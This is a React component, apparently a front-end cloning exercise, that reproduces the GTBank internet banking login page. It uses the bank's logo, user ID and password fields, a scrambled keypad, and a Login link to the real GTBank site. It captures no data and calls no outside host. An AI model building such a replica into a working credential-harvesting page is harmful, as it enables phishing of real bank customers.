import React, { Component } from 'react';
import logo from './gtblogo2.png';
import './App.css';
import img1 from './smehub1.png';
import img2 from './smehub2.png';
import shield from './shield.png';
import token from './token.png';
import counter from './counter.png';
import boxes from './boxes.png';

class App extends Component {
  render() {
    return (
      <div className="App">
        <header className="App-header">
          <img src={logo} alt={'logo'} />
        </header>
        <section id="top">
          <div className="top">
            <h2 className="topText">INTERNET BANKING</h2>
          </div>
        </section>
        <section id="body">
          <div className="container">
            <div className="mainBox">
              <h3>Online Realtime Balances and Transactions</h3>
              <p>Please type your user ID and use the keypad to enter your password.</p>
              <form>
                <div className="row">
                  <div className="col-25">
                    <label htmlFor={'userid/email'}>UserId/Email:</label>
                  </div>
                  <div className="col-75">
                    <input className="inputBox" type="email" name="userid/email"></input>
                  </div>
                </div>
                <div className="row">
                  <div className="col-25">
                    <label htmlFor={'password'}>Password:</label>
                  </div>
                  <div className="col-75">
                    <input className="inputBox" type="password" name="password"></input>
                  </div>
                </div>
                <div className="row">
                <div className="col-20">
                  
                </div>
                <div class="col-65">
                <div className="btnContainer">
                  <div className="btn">
                    <p>8</p>
                  </div>
                  <div className="btn">
                    <p>7</p>
                  </div>
                  <div className="btn">
                    <p>1</p>
                  </div>
                  <div className="btnRed">
                    <p>CLR</p>
                  </div>
                  <div className="btn">
                    <p>3</p>
                  </div>
                  <div className="btn">
                    <p>2</p>
                  </div>
                  <div className="btn">
                    <p>6</p>
                  </div>
                  <div className="btnRed">
                    <p>DEL</p>
                  </div>
                  <div className="btn">
                    <p>5</p>
                  </div>
                  <div className="btn">
                    <p>0</p>
                  </div>
                  <div className="btn">
                    <p>9</p>
                  </div>
                  <div className="btn">
                    <p>4</p>
                  </div>
                </div>
                <div className="forgot">
                  <p>&nbsp;&nbsp;Forgot your password/UserID?</p>
                  <p>Forgot your secret question?</p>
                </div>
                <div className="newHere">
                  <p>-   New here?</p>
                  <div className="btnRegister">
                    <p>Click to register</p>
                  </div>
                </div>
                </div>
                <div className="col-15">
                <a href="https://ibank.gtbank.com/ibank3/Alert.aspx" className="login">
                  <div className="btnLg">
                    <p>Login</p>
                  </div>
                </a>
                </div>
                </div>
                <div className="remember">
                <label>
                  <input
                    className="input"
                    name="isGoing"
                    type="checkbox"
                   /> <p className="rememberText">Remember My UserID</p>
                </label>
                </div>
              </form>
            </div>
            <div className="sideBox">
              <img src={img1} alt={'smehub1'} />
              <img src={img2} alt={'smehub2'} className="img2" />
            </div>
          </div>
          <div className="subContainer">
            <div className="smallBox box1">
              <h4>Security Tips</h4>
              <img src={shield} alt={'shield'} className="shield" />
              <p>Please note that GTBank will NEVER ask you to provide your PIN (Personal Identification Numbers).</p>
              <button className="boxBtn">
                READ MORE
              </button>
            </div>
            <div className="smallBox box2">
              <h4>Do you have a token?</h4>
              <img src={token} alt={'token'} className="token" />
              <p>Get a Token today and begin to carry out third party transfers and online payments.</p>
              <button className="boxBtn">
                GET YOURS
              </button>
            </div>
            <div className="smallBox box3">
              <h4>Account Transfers (Instant)</h4>
              <img src={counter} alt={'counter'} className="counter" />
              <img src={boxes} alt={'boxes'} className="boxes" />
              <p>The fastest way to transfer money to other bank accounts.</p>
              <button className="boxBtn">
                TRY IT TODAY
              </button>
            </div>
          </div>
        </section>
        <section id="footer">
          <div className="footer">
            <p className="footerLinks"><a href="#">GTBANK.COM</a> | <a href="#">TERMS & CONDITIONS</a> | <a href="#">WHISTLE BLOWER</a></p>
          </div>
        </section>
      </div>
    );
  }
}

export default App;
